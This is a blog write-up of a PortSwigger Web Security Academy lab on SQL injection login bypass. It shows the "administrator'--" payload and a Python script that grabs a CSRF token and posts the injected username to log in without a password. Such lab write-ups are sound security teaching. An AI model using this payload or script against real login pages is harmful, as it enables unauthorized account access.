---
layout: post
title: "Write-up: SQL injection vulnerability allowing login bypass"
date: 2023-05-28
---

<img src="/images/sqli-lab02/sqli-lab02-01.png" style="max-width:90%;">
 
 
Lab #2 by PortSwigger Web Security Academy: [https://portswigger.net/web-security/sql-injection/lab-login-bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass){:target="_blank"}
 
 <br/>
 

### Description

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

 <br/>

### Steps

Trying to login by using a single quote (`'`) as the username, returns an internal server error, demonstrating that the app is vulnerable.

<img src="/images/sqli-lab02/sqli-lab02-05.png" style="max-width:90%;">
 
 

By intercepting the Login POST request and appending `'--` to the administrator username, we can bypass the remaining part of the query that checks the password.

<img src="/images/sqli-lab02/sqli-lab02-04.png" style="max-width:90%;">

<br/>
And we're in!
<br/>

<img src="/images/sqli-lab02/sqli-lab02-03.png" style="max-width:90%;">

<br/>
Let's script the solution in Python. 

It's a `POST` request that expects three parameters: `csrf`, `username`, and `password`.


```python
import requests  
import sys  
import urllib3  
from bs4 import BeautifulSoup  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
  
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}  
  
def get_csrf_token(session, url):  
	response = session.get(url, verify=False, proxies=proxies)  
	soup = BeautifulSoup(response.text, 'html.parser')  
	# getting csrf from html input element  
	return soup.find("input")['value']  
  
  
if __name__ == "__main__":  
	try:  
		url = sys.argv[1].strip()  
		username = sys.argv[2].strip()  
	except IndexError:  
		print('Usage: %s <url> <username>, e.g www.example.com "1=1"' % sys.argv[0]) 
		sys.exit(-1)  
  
session = requests.Session()  
  
#password is not important knowing that Auth is bypassed from an SQLi in ther username parameter  
data = {"csrf": get_csrf_token(session, url), "username": username, "password": "randomstring"}  
response = session.post(url, data=data, verify=False, proxies=proxies)  
  
# Congratulations message will show up only after solving the lab manually.  
if "Congratulations" in response.text:  
	print("it worked.")  
else:  
	print("Didn't work.")
	
```


 
 <br/>
Testing the Python script:

```powershell
> python3 sqli-lab02.py "https://0ab000eb0409a6428036c6eb00f500b7.web-security-academy.net/login" "administrator'--"

```


 
 
<br/>
It worked! We can also validate it through Burp.
<br/>
 
<img src="/images/sqli-lab02/sqli-lab02-06.png" style="max-width:90%;">




